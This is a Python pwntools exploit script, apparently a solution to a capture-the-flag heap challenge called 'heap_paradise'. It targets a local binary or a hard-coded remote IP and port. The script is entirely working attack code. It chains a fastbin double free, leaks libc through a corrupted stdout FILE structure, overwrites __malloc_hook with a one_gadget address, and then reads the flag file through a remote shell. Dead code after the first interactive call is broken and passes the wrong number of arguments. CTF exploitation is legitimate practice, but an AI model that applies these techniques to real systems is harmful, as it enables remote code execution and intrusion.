from pwn import *
import sys
#context.log_level='debug'
HOST='139.180.216.34'
PORT=8888

if len(sys.argv)>1:
    r=remote(HOST,PORT)
else:
    r=process('./pwn',env={"LD_PRELOAD":"./libc-2.23.so"})

libc=ELF("./libc-2.23.so")

def menu(opt):
    r.sendlineafter("choice >>",str(opt))

def alloc(size, idx, data,line=True):
    menu(1)
    r.sendlineafter("weapon: ",str(size))
    r.sendlineafter("input index: ",str(idx))
    if line:
        r.sendlineafter("name:",data)
    else:
        r.sendafter("name:",data)

def free(idx):
    menu(2)
    r.sendlineafter("idx :",str(idx))

def getleak():
    # r.interactive()
    alloc(0x50,0,"a"*0x20+p64(0x0)+p64(0x61))
    alloc(0x60,1,p64(0x21)*6)
    alloc(0x50,2,"a"*0x30+p64(0)+p64(0x21))
    alloc(0x60,3,"aaaaaaaa")
    free(0)
    free(2)
    free(0)
    alloc(0x50,4,'\x30',line=False)
    alloc(0x50,5,"aa")
    alloc(0x50,6,p64(0))
    free(1)
    log.info("Half way")
    alloc(0x50,7,"e"*0x20+p64(0)+p64(0xb1))
    free(1)
    free(7)
    alloc(0x50,8,"A"*0x20+p64(0)+p64(0x71)+'\xdd\x25',line=False)
    # alloc(0x60,'\xdd\x25',line=False)
    alloc(0x60,8,"eeee")
    alloc(0x60,9,p64(0x0)*6+p64(0x00fbad1800000000)+p64(0)*3+'\x00'*4,line=False)
    r.recvline()
    r.recv(64)
    libc.address=u64(r.recv(8))
    log.info("libc @ "+hex(libc.address))
    free(3)
    free(1)
    free(3)
    alloc(0x60,0,p64(libc.address-0xb13))#0x3c46bd libc.address+0x3c46bd
    alloc(0x60,0,"aaaa")
    alloc(0x60,0,"aaaa")
    #gdb.attach(r)
    alloc(0x60,0,"w"*19+p64(libc.address-0x3c5600+0xf02a4))
    r.interactive()
    # alloc(0x60,p64(libc.symbols['__malloc_hook']-0x23))
    if True:
        alloc(0x60,p64(libc.address+0x3c46bd))#0x3c46bd libc.address+0x3c46bd
    else:
        alloc(0x60,p64(libc.symbols['__malloc_hook']-0x23))#0x3c46bd libc.address+0x3c46bd
    alloc(0x60,"aaaa")
    alloc(0x60,p64(0)) #10
    alloc(0x68,p64(0)*2+p64(0x00ffffffff000000)+p64(0)*1+'\x00'*3+p64(libc.address+0x4526a)+p64(libc.address+0x3c4700-0x28)+p64(0x77)+p64(libc.address+0x3c4620)+p64(libc.address+0x791e0)+p64(0x77)*3)
    r.sendline("cd /home/heap_paradise/")
    r.sendline("cat /home/heap_paradise/fl*")
    r.interactive()
    free(1)
    free(10)
    free(10)
    alloc(0x60,p64(libc.symbols['__malloc_hook']-0x23))
    alloc(0x60,p64(0))
    alloc(0x60,p64(0))
    # alloc(0x60,"eeeeeeee")
    # alloc(0x60,"eeeeeeee")



if __name__=='__main__':
    getleak()
    r.interactive()
